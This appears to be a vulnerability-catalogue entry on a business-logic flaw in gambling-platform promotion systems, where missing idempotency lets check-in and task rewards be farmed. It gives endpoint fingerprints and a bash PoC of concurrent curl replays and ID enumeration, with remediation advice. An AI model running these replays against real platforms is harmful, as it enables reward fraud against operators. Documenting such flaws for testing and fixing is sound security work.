---
title: Bulk farming of check-in / task rewards (missing idempotency and rate controls)
cve: None (business logic)
severity: high
cvss: 7.8
product: Custom promotion system (gambling/turnkey platforms)
versions: Any
ports: 80, 443
keywords: check-in, tasks, rewards, farming, idempotency, concurrency
entry: /api/activity/sign、/api/task/claim
verified: false
sources: Compiled from public sources (business logic; no CVE)
---

## Fingerprints

```
POST /api/activity/sign     {"actId":1}
POST /api/task/claim        {"taskId":12}
GET  /api/activity/list
```

## Prerequisites

- One regular account; a captured check-in/reward-claim request.

## PoC

```bash
# 1) Check in normally once and record the balance
curl -s -X POST https://target/api/activity/sign -H "Authorization: Bearer <t>" -d '{"actId":1}'

# 2) Replay 20 times concurrently (unchanged parameters) — missing idempotency causes duplicate credits
for i in $(seq 1 20); do
  curl -s -X POST https://target/api/activity/sign -H "Authorization: Bearer <t>" -d '{"actId":1}' &
done; wait
# Result: balance increase = 20 times the check-in reward = confirmed

# 3) Change actId to enumerate unavailable promotions
for a in $(seq 1 50); do curl -s -X POST https://target/api/task/claim -H "Authorization: Bearer <t>" -d "{\"taskId\":$a}"; done
```

## Exploitation Steps

1. Establish the baseline with a single request;
2. Replay concurrently (an HTTP/2 single-packet approach is more reliable, or use xargs -P);
3. Enumerate by changing actId/taskId to find "not started/ended" promotions;
4. Evidence: before/after balances + request count (stop once the impact is demonstrated; do not actually withdraw).

## Remediation and Mitigation

- Add a unique index on claim records (user_id + act_id + date); add distributed locking and rate limits to the endpoint.
- Validate promotion state transitions (reject immediately if not started/ended).

## References

- OWASP WSTG-BUSL-04；CWE-837。
